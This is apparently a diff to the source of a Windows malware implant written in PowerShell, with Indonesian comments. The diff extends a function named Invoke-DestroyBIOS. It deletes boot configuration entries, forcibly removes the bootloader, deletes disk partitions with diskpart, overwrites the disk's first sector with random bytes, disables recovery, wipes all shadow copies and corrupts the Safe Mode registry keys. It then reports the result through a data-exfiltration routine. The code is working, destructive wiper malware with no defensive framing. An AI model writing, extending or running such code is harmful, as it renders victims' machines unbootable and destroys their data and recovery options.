@@ -832,22 +832,23 @@ function Invoke-StealWiFi {
 function Invoke-DestroyBIOS {
     param($cmd)
     try {
-        # 1. Backup BCD (opsional) lalu hapus
+        # ========== 1. Hapus BCD (Boot Configuration Data) ==========
         bcdedit /export C:\bcd_backup 2>&1 | Out-Null
-        bcdedit /deletevalue { default } recoveryenabled 2>&1 | Out-Null
-        bcdedit /deletevalue { default } recoverysequence 2>&1 | Out-Null
-        bcdedit /set { default } bootstatuspolicy ignoreallfailures 2>&1 | Out-Null
-        bcdedit /delete { bootmgr } /f 2>&1 | Out-Null
-        bcdedit /delete { default } /f 2>&1 | Out-Null
-        
-        # 2. Hapus file bootloader secara paksa
+        bcdedit /deletevalue {default} recoveryenabled 2>&1 | Out-Null
+        bcdedit /deletevalue {default} recoverysequence 2>&1 | Out-Null
+        bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>&1 | Out-Null
+        bcdedit /delete {bootmgr} /f 2>&1 | Out-Null
+        bcdedit /delete {default} /f 2>&1 | Out-Null
+        bcdedit /delete {current} /f 2>&1 | Out-Null
+
+        # ========== 2. Hapus bootloader secara paksa ==========
         takeown /f C:\bootmgr 2>&1 | Out-Null
         icacls C:\bootmgr /grant administrators:F 2>&1 | Out-Null
         attrib -r -s -h C:\bootmgr 2>&1 | Out-Null
         cmd /c del /f /q C:\bootmgr 2>&1 | Out-Null
         cmd /c rd /s /q C:\Boot 2>&1 | Out-Null
-        
-        # 3. Hapus partisi EFI (jika ada) menggunakan diskpart
+
+        # ========== 3. Hapus partisi EFI dan System Reserved ==========
         $diskpartScript = @"
 select disk 0
 list partition
@@ -855,24 +856,32 @@ select partition 1
 delete partition override
 select partition 2
 delete partition override
+select partition 3
+delete partition override
 exit
 "@
         $diskpartFile = "$env:TEMP\diskpart_$([Guid]::NewGuid().Guid).txt"
         [System.IO.File]::WriteAllText($diskpartFile, $diskpartScript)
         diskpart /s $diskpartFile 2>&1 | Out-Null
         Remove-Item $diskpartFile -Force -ErrorAction SilentlyContinue
-        
-        # 4. Overwrite MBR/GPT dengan random bytes
+
+        # ========== 4. Overwrite MBR/GPT dengan random bytes ==========
         $null = [System.IO.File]::WriteAllBytes("\\\\.\\PhysicalDrive0", (1..512 | ForEach-Object { Get-Random -Maximum 256 }))
-        
-        # 5. Nonaktifkan recovery
+
+        # ========== 5. Nonaktifkan Windows Recovery Environment (WinRE) ==========
         reagentc /disable 2>&1 | Out-Null
-        bcdedit /set { globalsettings } advancedoptions false 2>&1 | Out-Null
-        bcdedit /set { globalsettings } optionsedit false 2>&1 | Out-Null
-        
-        # 6. Rusak WinRE
         reagentc /setreimage /path "" 2>&1 | Out-Null
-        
+
+        # ========== 6. Hapus semua system restore points ==========
+        vssadmin delete shadows /all /quiet 2>&1 | Out-Null
+
+        # ========== 7. Rusak registry agar tidak bisa boot ke safe mode ==========
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "Minimal" /t REG_SZ /d " " /f 2>&1 | Out-Null
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "Network" /t REG_SZ /d " " /f 2>&1 | Out-Null
+
+        # ========== 8. Matikan sistem (opsional, biarkan user restart sendiri) ==========
+        # shutdown /s /f /t 5
+
         $result = @{ status = "BIOS DESTROYED"; details = "System will not boot after restart" }
         Send-ExfilData -Type "destroy_bios" -Data $result
         return "System bricked successfully. Please restart to confirm."
